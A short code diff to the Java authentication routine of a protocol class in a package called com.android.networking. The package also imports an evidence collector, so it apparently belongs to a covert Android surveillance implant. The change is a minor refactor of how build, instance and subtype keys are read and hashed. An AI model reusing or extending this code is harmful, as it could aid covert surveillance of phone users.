@@ -28,6 +28,7 @@ import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
+import com.android.networking.interfaces.iKeys;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.Utils;
@@ -405,7 +406,7 @@ public class ZProtocol extends Protocol {
 	 * @return the byte[]
 	 */
 	protected byte[] forgeAuthentication() {
-		final Keys keys = Keys.self();
+		final iKeys keys = Keys.self();
 
 
 		/*byte[] randBlock = new byte[]{};
@@ -429,7 +430,7 @@ public class ZProtocol extends Protocol {
 
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
-		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
+		dataBuffer.write(Utils.padByteArray(Keys.getSubtype(), 16));
 		
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication 2, wrong array size"); //$NON-NLS-1$
@@ -441,7 +442,7 @@ public class ZProtocol extends Protocol {
 		final SHA1Digest digest = new SHA1Digest();
 		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
 		digest.update(keys.getInstanceId());
-		digest.update(Utils.padByteArray(keys.getSubtype(), 16));
+		digest.update(Utils.padByteArray(Keys.getSubtype(), 16));
 		digest.update(keys.getConfKey());
 		//digest.update(randBlock);
 				
